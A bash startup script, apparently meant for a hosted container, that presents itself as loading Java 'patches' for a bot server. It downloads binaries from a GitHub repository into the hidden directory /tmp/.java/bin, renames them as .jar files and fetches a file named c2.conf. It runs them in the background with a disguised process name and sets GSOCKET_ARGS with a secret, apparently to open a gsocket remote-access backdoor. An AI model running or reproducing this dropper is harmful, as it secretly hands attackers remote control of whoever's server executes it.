#!/bin/bash

function fetch_files() {
    echo "Downloading Patches ..."
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/rufastnde/c2.conf -o cfg.conf
    echo "DONE ..."
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
    export GSOCKET_ARGS="-s j6A9eD2a1E2c5A16f9L89-3D9g8Hbj7-5i6C4a9U6k1eCd9-F9i4J0d6A2803-8A1c5J1g60 -liqD"
    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
    echo "BOT SERVER STARTED ..."
}

export HOME=/home/container
if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
    echo "Patch files already loaded ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
